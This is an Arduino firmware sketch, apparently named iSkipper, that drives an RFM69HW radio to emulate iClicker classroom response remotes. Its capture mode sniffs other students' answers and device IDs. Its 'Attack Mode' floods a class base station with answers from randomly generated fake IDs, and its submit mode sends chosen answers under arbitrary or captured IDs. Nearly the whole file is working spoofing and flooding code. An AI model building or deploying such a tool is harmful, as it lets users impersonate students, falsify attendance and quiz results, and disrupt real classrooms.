/*
 Name:		iSkipper_Arduino_Sketch.ino
 Created:	2018/3/14 11:54:15
 Author:	CSR
*/

#include "iClickerEmulator.h"
#include "SerialSymbols.h"
#include <RingBufCPP.h>
#include <string.h>

/*For Arduino Nano and RFM69HW*/
#define IS_RFM69HW true //make true if using w version
#define IRQ_PIN 3		// Must Be 3 for Nano
#define CSN 10			// NSS pin,10 for Nano
/*End For Arduino Nano and RFM69HW*/

#define MAX_BUFFERED_PACKETS 20 //The capability of receiving buffer
#define SERIAL_BUFFER_SIZE 64
#define ARGUMENTS_SIZE 61

char serialBuffer[SERIAL_BUFFER_SIZE];
char operationArguments[ARGUMENTS_SIZE];
uint8_t serialReadLength = 0;

iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);
RingBufCPP<iClickerPacket_t, MAX_BUFFERED_PACKETS> recvBuf;


//The Fixed ID for emulating a normal iClikcer
const uint32_t FIXED_ISKIPPER_ID = 0xCDCDCDCD;

// the setup function runs once when you press reset or power the board
void setup()
{
	Serial.begin(115200);
	clicker.begin(iClickerChannels::AA);
	uint8_t thisID[4];
	intToByteArray(FIXED_ISKIPPER_ID,thisID);
	while (Serial.read() != OP_COMFIRM_CONNECTION) //Wait until connect
	{
		Serial.println(F("Initialization Complete. Waiting for COM command..."));
		for (uint16_t wait = 3000; wait > 0; wait--)
		{
			if (Serial.available() > 0)
				break;
			delay(1);
		}
	}
	Serial.println(F("Connection Established! iSkipper ID:"));
	Serial.println(RES_COMFIRM_CONNECTION);
	char strID[9];
	snprintf(strID, sizeof(strID), "%02X%02X%02X%02X", thisID[0], thisID[1], thisID[2], thisID[3]);
	Serial.println(strID);
}


// the loop function runs over and over again until power down or reset
void loop()
{
	char op = processSerialInput(); //Get operation(command) char from serial input
	switch (op)
	{
	//Capture Mode
	case OP_CAPTURE:
	{
		Serial.println(F("Start capture"));
		clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
		while (Serial.read() != OP_STOP)
		{
			char strCaptureResponse[30];
			iClickerPacket_t r;
			//see if there is a pending packet, check if its an answer packet
			while (recvBuf.pull(&r))
			{
				uint8_t *id = r.packet.answerPacket.id;
				char answer = iClickerEmulator::answerChar((iClickerAnswer_t)r.packet.answerPacket.answer);
				snprintf(strCaptureResponse, sizeof(strCaptureResponse), "Captured,%c,%02X%02X%02X%02X\n", answer, id[0], id[1], id[2], id[3]);
				Serial.print(strCaptureResponse);
			}
			delay(20);
		}
		clicker.stopPromiscuous();
		Serial.println(F("End Capture"));
		break;
	}
	//Attack Mode
	case OP_ATTACK:
	{
		/*Command Format:
		*	A,<Answer>,<Counts>/0
		*/
		Serial.println(F("Start Attack"));

		//parsing arguments
		char cAns = operationArguments[0];
		unsigned long iAttackCount = strtoul(&operationArguments[2], NULL, 10);

		Serial.println(iAttackCount);

		uint8_t id[ICLICKER_ID_LEN];
		iClickerAnswer_t ans;
		for (unsigned long i = 1; i <= iAttackCount; i++)
		{
			if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
				ans = clicker.charAnswer(cAns);
			else
				ans = clicker.randomAnswer();
			clicker.randomId(id);
			clicker.submitAnswer(id, ans, false);
			Serial.print(".");
			if (i % 40 == 0)
				Serial.println();
			if (cAns != 'P')
				delay(5);
			if (Serial.read() == OP_STOP)
				break;
		}

		Serial.println(F("\nAttack Finished"));
		break;
	}
	case OP_ANSWER:
	{
		char ans = operationArguments[0];
		uint8_t thisID[4];
		intToByteArray(FIXED_ISKIPPER_ID, thisID);
		Serial.println(F("Submit Answer:"));
		Serial.println(ans);
		for (int i = 0; i < 10; i++)
		{
			clicker.submitAnswer(thisID, clicker.charAnswer(ans), false);
			Serial.println(F("Submit Success!"));
			//if (clicker.submitAnswer(intToByteArray(FIXED_ISKIPPER_ID), clicker.charAnswer(ans), true))
			//{
			//	Serial.println(F("Submit Success!"));
			//}
			//else
			//{
			//	Serial.println(F("Submit Fail!"));
			//}
		}
		break;
	}

	case OP_CHANGE_CHANNEL:
	{
		/*Command Format:
		*	c,<Channel>/0
		*/
		clicker.setChannel(getChannelByString(operationArguments));
		if (operationArguments[0] > 'D' || operationArguments[0] < 'A' || operationArguments[1] > 'D' || operationArguments[1] < 'A')
		{
			Serial.println(F("Illegal input Channel, set to default AA channel"));
		}
		else
		{
			Serial.print(F("Successfully change channel to: "));
			Serial.print(operationArguments[0]);
			Serial.print(operationArguments[1]);
			Serial.println();
		}

		break;
	}
	case OP_SUBMIT: 
	{
		/*Command Format:
		*	S,<Answer>,<ID>\0
		*/
		Serial.println(F("Start SUBMIT mode, waiting for input..."));

		//loop for input answers and IDs
		/*Format:
		*	<Answer>,<ID>\0
		*/
		while (1) 
		{

			if (Serial.available() <= 0) 
			{
				continue;
			}
			char operationArguments[11];
			Serial.readBytesUntil('\0', operationArguments, 11);//Answer for 1 byte, comma for 1 byte, ID for 8 byte,\0 for 1 byte
			operationArguments[10] = '\0';
			if (operationArguments[0] == OP_STOP)
			{
				break;
			}
			char cAns = operationArguments[0];
			uint32_t iID = strtoul(&operationArguments[2], NULL, 16);
			uint8_t arrID[4];
			intToByteArray(iID, arrID);
			//Serial.println(input);
			//char strID[9];
			//snprintf(strID, sizeof(strID), "%02X%02X%02X%02X", arrID[0], arrID[1], arrID[2], arrID[3]);
			//Serial.println(strID);
			if (!clicker.validId(arrID))
			{
				Serial.println(F("Invalid ID"));
				continue;
			}
			clicker.submitAnswer(arrID, clicker.charAnswer(cAns), false);
			Serial.print(RES_SUCCESS);
			Serial.print('\0');
		}
		break;
	}


	case OP_RESET:
	{
		reset();
		break;
	}
	default:
	{
		Serial.println(F("No Running Progress, waiting for commands..."));
		for (uint16_t wait = 3000; wait > 0; wait--) 
		{
			if (Serial.available() > 0)
				break;
			delay(1);
		}
		break;
	}
	}
	//End Switch

	//cleanBuffers();
}

/*
*Read input commands from Serial ports
*Here are the command formats:
*		<COMMAND_CHAR>+','+<COMMAND_ARGUMENTS>+'\0'
*Since the Arduino's serial buffer is 64bytes, the command arguments should be not longer than 61bytes
*/
char processSerialInput()
{
	if (Serial.available() > 0)
	{
		//delay(30);//waiting for fully receiving
		serialReadLength = Serial.readBytesUntil('\0', serialBuffer, SERIAL_BUFFER_SIZE);
		serialBuffer[serialReadLength] = '\0';
		char cOperation = serialBuffer[0];
		strlcpy(operationArguments, &serialBuffer[2], ARGUMENTS_SIZE);
		Serial.println(F("Command received:"));
		//for (register uint16_t i = 0; i < SERIAL_BUFFER_SIZE; i++)
		//{
		//	Serial.print((byte)serialBuffer[i]);
		//	Serial.print(' ');
		//}
		Serial.println(serialBuffer);
		Serial.println(F("Operation:"));
		Serial.println(cOperation);
		Serial.println(F("Arguments:"));
		Serial.println(operationArguments);

		return cOperation;
	}
	return OP_INVALID_OPERATION;
}

// reset function jump to address 0
void reset()
{
	__asm("jmp 0");
}

void cleanBuffers()
{
	for (register uint16_t i = 0; i < SERIAL_BUFFER_SIZE; i++)
	{
		serialBuffer[i] = 0;
	}
	for (register uint16_t i = 0; i < ARGUMENTS_SIZE; i++)
	{
		operationArguments[i] = 0;
	}
}

//return the Channel base on the first two chars in string, return AA if illegal input
iClickerChannel getChannelByString(char *str)
{
	int index = (str[0] - 'A') * 4 + (str[1] - 'A'); //Calculate channel index in channels[] array
	if (index > NUM_ICLICKER_CHANNELS - 1 || index < 0)
		return iClickerChannels::channels[0]; //return AA if illegal input
	return iClickerChannels::channels[index];
}

inline bool isDigit(char c)
{
	return c >= '0' && c <= '9';
}


//Output pointer must point to an array of exactly 4 Byte.
void intToByteArray(uint32_t input,uint8_t* output)
{
	output[0] = input >> 24;
	output[1] = input >> 16 & 0xFF;
	output[2] = input >> 8 & 0xFF;
	output[3] = input & 0xFF;
}

void recvPacketHandler(iClickerPacket_t *recvd)
{
	recvBuf.add(*recvd);
}
